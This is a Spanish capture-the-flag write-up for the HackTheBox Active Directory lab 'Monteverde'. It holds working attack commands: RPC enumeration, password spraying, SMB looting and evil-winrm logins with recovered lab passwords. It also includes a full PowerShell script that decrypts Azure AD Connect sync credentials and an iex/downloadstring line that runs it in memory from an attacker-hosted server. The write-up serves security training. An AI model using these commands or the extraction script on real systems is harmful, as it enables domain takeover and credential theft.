[🌿 Monteverde — HTB [Windows · Medium · AD] 36c15bd2d16c8116be57fdfac510425a.md](https://github.com/user-attachments/files/28309538/Monteverde.HTB.Windows.Medium.AD.36c15bd2d16c8116be57fdfac510425a.md)
# 🌿 Monteverde — HTB [Windows · Medium · AD]

| Campo | Detalle |
| --- | --- |
| IP | `10.129.29.254` |
| Dominio | `MEGABANK.LOCAL` |
| Vector inicial | RPC anónimo → password spray (user=pass) → SMB share |
| Usuario inicial | `SABatchJobs` : `SABatchJobs` |
| Pivote | `mhope` : `4n0therD4y@n0th3r$` (azure.xml en SMB) |
| Escalada | Azure AD Connect → extracción de credenciales MSOL de ADSync DB |
| Root | `administrator` : `d0m@in4dminyeah!` vía script PowerShell |
| Metasploit | ❌ No usado |

---

# 1. Reconocimiento

## Nmap — puertos

Perfil de DC sin HTTP esta vez. Los puertos relevantes: Kerberos, LDAP, SMB, WinRM. Sin puerto 80 no hay web que enumerar, así que el vector tiene que ser por el dominio directamente.

```bash
nmap -sS -p- --min-rate 5000 10.129.29.254
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/MonteVerde/assets/image.png)
> 

## Nmap — versiones

Aquí aparece algo inusual: los puertos salen como `filtered` en el scan de versiones, no como `open`. No hay detalles concretos de versiones. El hostname es MONTEVERDE, dominio MEGABANK.LOCAL — suficiente para continuar.

```bash
nmap -sVC -p 53,88,135,139,389,445,636,3268,3269,5985,9389 10.129.29.254
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/MonteVerde/assets/image1.png)
> 

---

# 2. Enumeración

## RPC anónimo — usuarios y grupos

Sin versiones y sin HTTP, RPC anónimo es el primer vector. Funciona y vuelca toda la información del dominio: usuarios, grupos, info del dominio.

```bash
rpcclient -U '' -N 10.129.29.254
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/MonteVerde/assets/image2.png)
> 

Con la lista de usuarios construimos un archivo `users.txt` e intentamos password spray. La táctica más básica: usuario=contraseña.

## Password spray — usuario como contraseña

```bash
nxc smb 10.129.29.254 -u users.txt -p users.txt --no-bruteforce
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/MonteVerde/assets/image3.png)
> 

---

# 3. Explotación — SMB share azure_uploads y users$

Con `SABatchJobs` tenemos acceso de lectura a shares interesantes. El share `users$` tiene los directorios home de los usuarios del dominio. Buscamos archivos de configuración, credenciales, cualquier cosa útil.

```bash
smbclient //10.129.29.254/users$ -U 'SABatchJobs%SABatchJobs'
smb: \> ls
smb: \mhope\> ls
smb: \mhope\> get azure.xml
```

El archivo `azure.xml` en el directorio de `mhope` contiene una contraseña en texto claro: `4n0therD4y@n0th3r$`. El archivo es un fichero de configuración de Azure AD con credenciales hardcodeadas.

---

# 4. Acceso inicial — evil-winrm como mhope

```bash
evil-winrm -i 10.129.29.254 -u mhope -p '4n0therD4y@n0th3r$'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/MonteVerde/assets/image4.png)
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/MonteVerde/assets/image5.png)
> 

---

# 5. Escalada — Azure AD Connect credential extraction

## Reconocimiento post-explotación

Lo primero es entender con qué contamos. Verificamos privilegios, grupos y si hay servicios de Azure instalados.

```powershell
# Ver grupos del usuario
net user mhope

# Verificar si ADSync está corriendo
Get-Service ADSync

# Confirmar que los binarios están
ls 'C:\Program Files\Microsoft Azure AD Sync\Bin'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/MonteVerde/assets/image6.png)
> 

mhope es miembro de `Azure Admins`. Azure AD Connect está instalado en esta máquina y sincroniza credenciales entre el AD local y Azure AD. La base de datos local `ADSync` almacena las credenciales del usuario de sincronización cifradas con DPAPI. Un miembro de Azure Admins puede conectarse a esa BD y usar las DLLs del propio servicio para descifrarlas.

## El script de extracción

El script conecta a la instancia local de SQL Server donde vive la BD ADSync, extrae las claves de cifrado y el blob cifrado, y usa `mcrypt.dll` (la DLL del propio Azure AD Connect) para descifrar la contraseña en claro:

```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name='Domain';Expression={$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name='Username';Expression={$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name='Password';Expression={$_.node.InnerXML}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

Servimos el script desde Kali y lo ejecutamos en memoria desde la sesión de mhope:

```bash
# Kali
python3 -m http.server 80
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/MonteVerde/assets/image7.png)
> 

```powershell
# Desde evil-winrm como mhope
iex(new-object net.webclient).downloadstring('http://10.10.14.27/msol.ps1')
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/MonteVerde/assets/image8.png)
> 

## Acceso como Administrator

```bash
evil-winrm -i 10.129.29.254 -u administrator -p 'd0m@in4dminyeah!'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/MonteVerde/assets/image9.png)
> 

---

# 6. Cadena de ataque

```
RPC anónimo → enumdomusers → lista de usuarios
    ↓
nxc SMB password spray (user=pass) → SABatchJobs:SABatchJobs
    ↓
SMB users$ → mhope\azure.xml → mhope:4n0therD4y@n0th3r$
    ↓
evil-winrm mhope → user.txt
    ↓
mhope ∈ Azure Admins → acceso a ADSync DB
    ↓
script PowerShell → mcrypt.dll → descifrar credenciales MSOL
    ↓
Domain: MEGABANK.LOCAL / Username: administrator / Password: d0m@in4dminyeah!
    ↓
evil-winrm administrator → root.txt
```

---

# 7. Moralejas

## Password spray con user=pass siempre merece un intento

Cuentas de servicio y batch jobs creadas por administradores perezosos con frecuencia tienen la contraseña igual al nombre de usuario. `SABatchJobs:SABatchJobs` es el ejemplo perfecto. El spray con `--no-bruteforce` en nxc hace exactamente eso: cada usuario se prueba solo contra su propio nombre, sin riesgo de lockout.

## Los shares SMB con READ son minas de información

El share `users$` parece inocuo pero tenía los directorios home de todos los usuarios. Cualquier archivo de configuración, script, o dato que alguien haya dejado ahí es accesible. `azure.xml` con una contraseña en texto claro es el hallazgo clásico — buscar siempre archivos `.xml`, `.config`, `.ps1`, `.bat` en todos los shares accesibles.

## Azure AD Connect instalado = vector de extracción de credenciales

Cuando hay Azure AD Connect en un DC o servidor del dominio, el servicio ADSync almacena las credenciales del usuario de sincronización en una BD local cifrada con las propias DLLs del servicio. El script de extracción (basado en el trabajo de Adam Chester / XPN) es público y funciona si tienes acceso como miembro de `ADSyncAdmins` o `Azure Admins`. En un pentest real esto es Domain Admin garantizado.

## `iex(iwr ...)` es la forma limpia de ejecutar scripts en memoria

Servir el script con `python3 -m http.server` y descargarlo con `Invoke-Expression` + `WebClient` evita tocar el disco del objetivo. El script nunca se escribe — se ejecuta directamente en memoria. Esto es técnica OSCP-friendly y evita detecciones basadas en escritura de archivos.

## El patrón OSCP de esta máquina

```
RPC anónimo → password spray (user=pass)
    ↓
SMB shares → credenciales en archivo de configuración
    ↓
Servicio privilegiado instalado (Azure AD Connect) → extracción de credenciales
    ↓
Administrator directo
```

Cadena corta pero el vector de Azure AD Connect es único — una vez que lo ves una vez, lo reconoces instantáneamente en el OSCP.

---

# 8. Conceptos técnicos clave

**Azure AD Connect / ADSync:** Servicio que sincroniza identidades entre un AD on-premise y Azure AD. Para funcionar necesita una cuenta con derechos de replicación (GetChanges + GetChangesAll) en el AD local. Las credenciales de esa cuenta se guardan cifradas en la base de datos local `ADSync` (SQL Server LocalDB).

**Extracción de credenciales ADSync:** La BD almacena un blob cifrado con DPAPI usando claves específicas del servicio. Las propias DLLs de Azure AD Connect (`mcrypt.dll`) exponen la clase `KeyManager` que permite cargar el keyset y descifrar el blob. El ataque fue documentado por Adam Chester (XPN) en 2019 — es público y conocido, pero muchos entornos siguen siendo vulnerables.

**Password spray vs brute force:** El spray prueba una sola contraseña contra todos los usuarios (o user=pass en este caso). El brute force prueba múltiples contraseñas contra un usuario. El spray no dispara lockouts porque cada cuenta recibe solo un intento. En AD el umbral típico de lockout es 5-10 intentos fallidos.

---

# 9. Comandos clave

```bash
# Reconocimiento
nmap -sS -p- --min-rate 5000 10.129.29.254
nmap -sVC -p 53,88,135,139,389,445,636,3268,5985 10.129.29.254

# Enumeración RPC anónima
rpcclient -U '' -N 10.129.29.254
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo

# Password spray (user=pass)
nxc smb 10.129.29.254 -u users.txt -p users.txt --no-bruteforce

# SMB — buscar archivos en shares accesibles
smbclient //10.129.29.254/users$ -U 'SABatchJobs%SABatchJobs'
# ls, cd mhope, get azure.xml

# Acceso inicial
evil-winrm -i 10.129.29.254 -u mhope -p '4n0therD4y@n0th3r$'

# Post-explotación — verificar Azure AD Connect
Get-Service ADSync
ls 'C:\Program Files\Microsoft Azure AD Sync\Bin'
net user mhope  # verificar grupo Azure Admins

# Servir script desde Kali
python3 -m http.server 80

# Ejecutar script en memoria desde mhope
iex(new-object net.webclient).downloadstring('http://<TU_IP>/msol.ps1')

# Acceso como Administrator
evil-winrm -i 10.129.29.254 -u administrator -p 'd0m@in4dminyeah!'
```
